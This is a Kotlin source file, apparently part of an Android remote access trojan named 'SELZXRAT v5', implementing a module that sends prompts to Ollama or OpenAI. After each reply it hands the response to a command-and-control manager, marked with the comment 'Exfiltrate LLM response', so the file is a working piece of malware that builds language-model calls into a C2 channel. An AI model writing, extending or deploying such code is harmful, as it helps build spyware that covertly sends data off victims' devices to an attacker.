package com.selzxrat.v5.services

import android.content.Context
import android.util.Log
import com.selzxrat.v5.C2Manager
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL
import org.json.JSONObject

class LLMModule(private val context: Context) {

    companion object {
        private const val TAG = "LLMModule"
        private const val OLLAMA_ENDPOINT = "http://localhost:11434/api/generate"
        private const val OPENAI_ENDPOINT = "https://api.openai.com/v1/chat/completions"

        // LLM modes
        const val MODE_OLLAMA = "ollama"
        const val MODE_OPENAI = "openai"
    }

    data class LLMConfig(
        val mode: String = MODE_OLLAMA,
        val model: String = "llama3:8b",
        val apiKey: String = "",
        val systemPrompt: String = "You are SELZXRAT AI. Respond concisely.",
        val maxTokens: Int = 256,
        val temperature: Float = 0.7f
    )

    private var config = LLMConfig()
    private var isRunning = false
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun updateConfig(newConfig: LLMConfig) {
        config = newConfig
        Log.d(TAG, "LLM config updated: mode=${config.mode}, model=${config.model}")
    }

    fun trigger(prompt: String, callback: (String) -> Unit) {
        if (isRunning) {
            callback("LLM is already processing a request")
            return
        }

        isRunning = true
        scope.launch {
            try {
                val result = when (config.mode) {
                    MODE_OLLAMA -> queryOllama(prompt)
                    MODE_OPENAI -> queryOpenAI(prompt)
                    else -> "Unknown LLM mode: ${config.mode}"
                }

                withContext(Dispatchers.Main) {
                    callback(result)
                    // Exfiltrate LLM response
                    C2Manager.sendCommand("self", "llm_response", result)
                }
            } catch (e: Exception) {
                Log.e(TAG, "LLM query failed: ${e.message}")
                withContext(Dispatchers.Main) {
                    callback("LLM Error: ${e.message}")
                }
            } finally {
                isRunning = false
            }
        }
    }

    private suspend fun queryOllama(prompt: String): String {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("model", config.model)
                    put("prompt", "$config.systemPrompt\n\nUser: $prompt\n\nAssistant:")
                    put("stream", false)
                    put("options", JSONObject().apply {
                        put("temperature", config.temperature)
                        put("num_predict", config.maxTokens)
                    })
                }

                val conn = URL(OLLAMA_ENDPOINT).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 30000
                conn.readTimeout = 30000

                conn.outputStream.write(json.toString().toByteArray())
                val response = conn.inputStream.bufferedReader().readText()
                conn.disconnect()

                val respJson = JSONObject(response)
                respJson.optString("response", "No response from Ollama")
            } catch (e: Exception) {
                "Ollama query failed: ${e.message}"
            }
        }
    }

    private suspend fun queryOpenAI(prompt: String): String {
        return withContext(Dispatchers.IO) {
            try {
                val messagesArray = org.json.JSONArray().apply {
                    put(JSONObject().apply {
                        put("role", "system")
                        put("content", config.systemPrompt)
                    })
                    put(JSONObject().apply {
                        put("role", "user")
                        put("content", prompt)
                    })
                }

                val json = JSONObject().apply {
                    put("model", config.model)
                    put("messages", messagesArray)
                    put("max_tokens", config.maxTokens)
                    put("temperature", config.temperature)
                }

                val conn = URL(OPENAI_ENDPOINT).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Authorization", "Bearer ${config.apiKey}")
                conn.doOutput = true
                conn.connectTimeout = 30000
                conn.readTimeout = 60000

                conn.outputStream.write(json.toString().toByteArray())
                val response = conn.inputStream.bufferedReader().readText()
                conn.disconnect()

                val respJson = JSONObject(response)
                val choices = respJson.optJSONArray("choices")
                if (choices != null && choices.length() > 0) {
                    choices.getJSONObject(0).optJSONObject("message")?.optString("content", "") ?: "No response"
                } else {
                    "Error: ${respJson.optJSONObject("error")?.optString("message", "Unknown")}"
                }
            } catch (e: Exception) {
                "OpenAI query failed: ${e.message}"
            }
        }
    }

    fun destroy() {
        scope.cancel()
        isRunning = false
    }
}